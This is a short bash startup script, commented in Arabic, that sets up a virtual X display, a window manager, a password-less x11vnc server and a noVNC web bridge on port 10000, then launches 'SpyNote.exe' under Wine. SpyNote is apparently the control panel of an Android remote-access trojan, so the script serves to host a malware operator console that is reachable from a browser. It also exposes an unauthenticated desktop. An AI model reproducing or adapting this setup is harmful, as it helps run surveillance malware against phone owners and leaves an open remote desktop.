#!/bin/bash

# حذف أقفال الشاشة القديمة
rm -f /tmp/.X1-lock /tmp/.X11-unix/X1

# بدء خادم العرض Xvfb
Xvfb :1 -screen 0 1024x768x16 &
export DISPLAY=:1

# انتظار حتى يصبح Xvfb جاهزاً
for i in {1..10}; do
    xdpyinfo -display :1 >/dev/null 2>&1 && break
    echo "Waiting for Xvfb... ($i)"
    sleep 1
done

# بدء مدير النوافذ Fluxbox
fluxbox &

# بدء خادم VNC
x11vnc -forever -shared -nopw -display :1 -rfbport 5900 -bg -o /app/x11vnc.log

# تشغيل SpyNote مباشرة (بدون explorer) وتسجيل الأخطاء
echo "Starting SpyNote.exe..."
wine /app/SpyNote.exe 2>&1 | tee /app/wine.log &

# بدء noVNC
echo "Starting websockify on port 10000..."
websockify --web /usr/share/novnc/ 10000 localhost:5900
